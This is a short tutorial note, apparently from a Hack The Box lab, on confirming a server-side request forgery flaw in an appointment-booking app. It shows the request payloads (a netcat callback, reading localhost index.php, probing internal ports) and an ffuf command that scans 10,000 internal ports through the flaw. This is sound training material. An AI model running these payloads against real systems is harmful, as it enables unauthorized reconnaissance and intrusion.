---
title: b-Identify SSRF
draft: false
tags:
  - ssrf
  - ssrf-identify
  - ffuf
---
## Confirm SSRF

> Assume there is a web app with a functionality to schedule appointments.

When checking the data availability for appointment, following request is being used:

`dateserver=http://dateserver.com/availability.php&date=2024-01-01`

This means the web server is fetching the availability information from a separate system determined by the URL passed in the POST parameter.

We can confirm SSRF by pointing dateserver towards our netcat listener as such:

`dateserver=http://my-ip:8000/ssrf&date=2024-01-01`

We get a incoming connection:

```shell-session
jadu101@htb[/htb]$ nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38782
GET /ssrf HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*
```

We can check if SSRF is blind or not by trying to read `index.php`:

`dateserver=http://127.0.0.1/index.php&date=2024-01-01`

If the above displays the content of index.php, we know that the SSRF is not blind.

## Enumerate System

We can use SSRF to port scan on the system. 

`dateserver=http://127.0.0.1:80&date=2024-01-01`

If the response to above request is something like `Error` or `Fail`, we can know that the port is probably closed.

We can automate this using `ffuf`.

First, create a list of 10,000 ports:

```shell-session
jadu101@htb[/htb]$ seq 1 10000 > ports.txt
```

Now use `ffuf` to fuzz all open ports by filtering out responses containing error message we identified earlier:

```shell-session
jadu101@htb[/htb]$ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"

<SNIP>

[Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 0ms]
    * FUZZ: 3306
[Status: 200, Size: 8285, Words: 2151, Lines: 158, Duration: 338ms]
    * FUZZ: 80
```

Results shows port 3306 is open.

